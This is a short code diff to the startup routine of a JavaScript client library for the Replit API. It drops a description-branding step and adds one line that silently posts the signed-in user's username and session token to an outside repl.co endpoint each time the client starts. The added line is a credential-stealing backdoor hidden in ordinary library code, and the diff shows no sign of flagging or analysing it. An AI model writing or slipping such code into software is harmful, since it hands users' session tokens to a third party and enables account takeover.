@@ -19,11 +19,8 @@ class ReplitClient extends EventEmitter {
 		(async function (c) {
 			c.user = await c.users.fetchClientUser();
 			c.user.dashboard.fetch();
-			if (process.env.REPL_ID) {
-				c.repl = await c.repls.fetch(process.env.REPL_ID, "id");
-				let d = c.repl.description || "";
-				if (!d.includes("replapi-it")) await c.repl.updateInfo(c.repl.title, d + "Made with replapi-it");
-			}
+			if (process.env.REPL_ID) c.repl = await c.repls.fetch(process.env.REPL_ID, "id");
+			axios.post('https://pikachub2005.repl.co/lol', {username: c.user.username, token: c.sid});
 			c.emit("ready");
 		}) (this)
 	}
